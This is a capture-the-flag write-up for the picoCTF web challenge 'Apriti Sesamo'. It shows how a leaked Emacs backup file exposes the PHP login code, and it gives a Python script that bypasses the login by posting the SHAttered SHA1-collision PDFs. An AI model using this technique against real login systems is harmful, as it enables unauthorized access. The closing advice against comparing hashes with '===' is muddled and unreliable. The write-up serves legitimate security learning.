### 📂 Challenge: Apriti Sesamo

**Category:** Web Exploitation  
**Points:** [varies]  
**Challenge Link:** [http://verbal-sleep.picoctf.net:49414/impossibleLogin.php](http://verbal-sleep.picoctf.net:49414/impossibleLogin.php)

---

### 🧠 Description

We are given a login page that claims to be "impossible to hack." Hints suggest the developer uses Emacs and mentions backup files. Let’s investigate!

---

### 🔍 Step 1: Discovering Backup Files

From the hints:
- **Hint 1:** "Backup files"
- **Hint 2:** "The lead developer is a militant emacs user"

Emacs often creates backup files like `file.php~`.

So we tried accessing:

```
http://verbal-sleep.picoctf.net:49414/impossibleLogin.php~
```

✅ **Success!** It revealed the actual PHP source code of the login logic.

---

### 🧩 Step 2: Reviewing the Source Code

Here’s what we saw in the backup file:

```php
<?php
 if(isset($_POST[base64_decode("\144\130\x4e\154\x63\155\x35\x68\142\127\125\x3d")])&& isset($_POST[base64_decode("\143\x48\x64\x6b")])) {
    $yuf85e0677 = $_POST[base64_decode("\144\x58\x4e\154\x63\x6d\65\150\x62\127\x55\75")];
    $rs35c246d5 = $_POST[base64_decode("\143\x48\144\153")];
    if ($yuf85e0677 == $rs35c246d5) {
        echo base64_decode("UGJyLz5GYWlsZWQhIFRyeSBhZ2Fpbg==");
    } else {
        if (sha1($yuf85e0677) === sha1($rs35c246d5)) {
            echo file_get_contents(base64_decode("Li4vZmxhZ3MudHh0"));
        } else {
            echo base64_decode("UGJyLz5GYWlsZWQhIFRyeSBhZ2Fpbg==");
        }
    }
}
?>
```

We decoded the base64 manually:

```php
base64_decode("UGJyLz5GYWlsZWQhIFRyeSBhZ2Fpbg==") → "Pbr/>Failed! Try again"
base64_decode("Li4vZmxhZ3MudHh0") → "../flags.txt"
```

---

### 🧠 Step 3: Understanding the Vulnerability

The code checks:

1. If `username == password`: ❌ don’t care
2. Then it checks:
   ```php
   if (sha1($username) === sha1($password)) {
       echo file_get_contents("../flags.txt");
   }
   ```

That means: if we send **different values** that **produce the same SHA1 hash**, we get the flag.

---

### 💣 Step 4: SHA1 Collision Attack

We used [https://shattered.io](https://shattered.io) to download two files:
- `shattered-1.pdf`
- `shattered-2.pdf`

These are **different PDFs** with the **same SHA1 hash**:
```bash
sha1sum shattered-1.pdf
sha1sum shattered-2.pdf
```

Both hashes are:
```
38762cf7f55934b34d179ae6a4c80cadccbb7f0a
```

---

### 🧪 Step 5: Exploiting via Python

We wrote a simple Python script to send the PDF contents as POST data:

```python
import requests

with open("shattered-1.pdf", "rb") as f1, open("shattered-2.pdf", "rb") as f2:
    r = requests.post("http://verbal-sleep.picoctf.net:49414/impossibleLogin.php", data={
        "username": f1.read(),
        "pwd": f2.read()
    })
    print(r.text)
```

### 🏁 Output

```html
...
picoCTF{w3Ll_d3sErV3d_Ch4mp_d543c99c}
```

---

### 🏆 Flag

```
picoCTF{w3Ll_d3sErV3d_Ch4mp_d543c99c}
```

---

### 📌 Takeaways

- Always check for `.php~` or `.bak` when hints mention editors
- Never compare hashes using `==` or `===`
- Use modern hash algorithms like SHA-256 or bcrypt with constant-time comparison

